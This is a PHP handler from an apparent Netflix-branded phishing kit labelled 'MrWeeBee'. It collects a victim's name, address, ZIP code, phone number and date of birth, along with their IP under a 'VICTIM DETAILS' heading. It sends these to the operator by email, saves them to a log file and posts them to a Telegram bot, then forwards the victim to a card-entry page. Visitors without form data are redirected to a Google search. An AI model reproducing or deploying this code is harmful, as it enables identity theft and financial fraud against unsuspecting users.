<?php
$settings = include '../../settings/settings.php';

# Debug 

if($settings['debug'] == "1"){
  error_reporting(E_ALL);
  ini_set('display_errors', '1');
  ini_set('display_startup_errors', '1');
}



if(empty($_POST['firstName']) || !isset($_POST['firstName'])){
  setcookie("logged_in", "0");
  header('Location: https://href.li/?https://www.google.com/search?q='.$settings['out']);
}


# Allow URL Open

ini_set('allow_url_fopen',1);


function get_client_ip() {
    $ipaddress = '';
    if (getenv('HTTP_CLIENT_IP'))
        $ipaddress = getenv('HTTP_CLIENT_IP');
    else if(getenv('HTTP_X_FORWARDED_FOR'))
        $ipaddress = getenv('HTTP_X_FORWARDED_FOR');
    else if(getenv('HTTP_X_FORWARDED'))
        $ipaddress = getenv('HTTP_X_FORWARDED');
    else if(getenv('HTTP_FORWARDED_FOR'))
        $ipaddress = getenv('HTTP_FORWARDED_FOR');
    else if(getenv('HTTP_FORWARDED'))
        $ipaddress = getenv('HTTP_FORWARDED');
    else if(getenv('REMOTE_ADDR'))
        $ipaddress = getenv('REMOTE_ADDR');
    else
        $ipaddress = 'UNKNOWN';
    return $ipaddress;
}

$IP = get_client_ip();

# Settings


$settings = include '../../settings/settings.php';
$owner = $settings['email'];
$filename = "../../Logs/results.txt";
$client = file_get_contents("../../Logs/client.txt");


# Variables

$first_name = $_POST['firstName'];
$last_name = $_POST['lastName'];
$address = $_POST['al'];
$address2 = $_POST['al2'];
$zipcode = $_POST['zip'];
$state = $_POST['state'];
$country = $settings['country'];
$number = $_POST['phone'];
$dob = $_POST['dob'];
$city = $_POST['city'];

# Zip Code Lookup

if($settings['zip_lookup'] == "1"){
  function lookup($zip, $api, $country){
  
    # Init Curl

    $ch = curl_init();
    
    $data = ["codes" => $zip, "country" => $country];

    # Curl Options

    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_HEADER, false);
    curl_setopt($ch, CURLOPT_URL, "https://app.zipcodebase.com/api/v1/search?" . http_build_query($data));
    curl_setopt($ch, CURLOPT_HTTPHEADER, array("Content-Type: application/json", "apikey: {$api}"));

    # Response

    $response = curl_exec($ch);
    curl_close($ch);

    # JSON 

    $json = json_decode($response);

    return $json;
  }
  if(isset($settings['zip_api'])){
    $zipcode_result = get_object_vars(lookup($zipcode, $settings['zip_api'], strtolower($country))->results->{$zipcode}[0]);
    if($zipcode_result){
      $city_c     = $zipcode_result['city'];
      $state_c    = $zipcode_result['state'];
      $province_c = $zipcode_result['province'];
      $state_cc   = $zipcode_result['state_code'];
      $values = array($city_c,$state_c,$province_c,$state_cc);
      foreach ($values as $value) {
        if(empty($value)||!isset($value)){
          $value = "N/A ❌";
        }
      }
    } else if(!$zipcode_result){
      $city_c = "BAD ZIPCODE 📛";
      $state_c = "BAD ZIPCODE 📛";
      $province_c = "BAD ZIPCODE 📛";
      $state_cc = "BAD ZIPCODE 📛";
    }
  } else {
    $city_c     = "API MISSING ❌";
    $state_c    = "API MISSING ❌";
    $state_cc = "API MISSING ❌";
    $province_c = "API MISSING ❌";
  }
} else {
  $city_c = "ZIP LOOKUP DISABLED ✖️";
  $state_c  = "ZIP LOOKUP DISABLED ✖️";
  $state_cc = "ZIP LOOKUP DISABLED ✖️";
  $province_c = "ZIP LOOKUP DISABLED ✖️";
}

# Messsage

$message = "[ ❤️ NETFLIX  | CLIENT : {$client} ❤️ ]\n\n";
$message .= "********** [ 🏘 ADDRESS INFORMATION 📩 ] **********\n";
$message .= "# FIRSTNAME   : {$first_name}\n";
$message .= "# LASTNAME    : {$last_name}\n";
$message .= "# ADDRESS     : {$address}\n";
$message .= "# ADDRESS#2   : {$address2}\n";
$message .= "# ZIPCODE     : {$zipcode}\n";
$message .= "# NUMBER      : +1 {$number}\n";
$message .= "# CITY        : {$city}\n";
$message .= "# DOB         : {$dob}\n";
$message .= "********** [ 🧍‍♂️ VICTIM DETAILS 🧍‍♂️ ] **********\n";
$message .= "# IP ADDRESS : {$IP}\n";
$message .= "**********************************************\n";

# Send Mail

if ($settings['send_mail'] == "1"){
  $to = $owner;
  $client = file_get_contents("../../Logs/client.txt");
  $headers = "Content-type:text/plain;charset=UTF-8\r\n";
  $headers .= "From: MrWeeBee <netflix@client_{$client}_site.com>\r\n";
  $subject = " MRWEEBEE ✦ NETFLIX ✦ BILLING  ✦ CLIENT #{$client} ✦ {$IP} ";
  $msg = $message;
  mail($to, $subject, $msg, $headers);
}

# Save Log 

if ($settings['save_results'] == "1"){
  $results = fopen($filename, "a+");
  fwrite($results, $message);
  fclose($results);
}

# Send Bot

if ($settings['telegram'] == "1"){
  $data = $message;
  $send = ['chat_id'=>$settings['chat_id'],'text'=>$data];
  $website = "https://api.telegram.org/{$settings['bot_url']}";
  $ch = curl_init($website . '/sendMessage');
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
  curl_setopt($ch, CURLOPT_POST, 1);
  curl_setopt($ch, CURLOPT_POSTFIELDS, ($send));
  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
  $result = curl_exec($ch);
  curl_close($ch);
}

 echo "<script>window.location.href =\"card\"; </script>";

?>
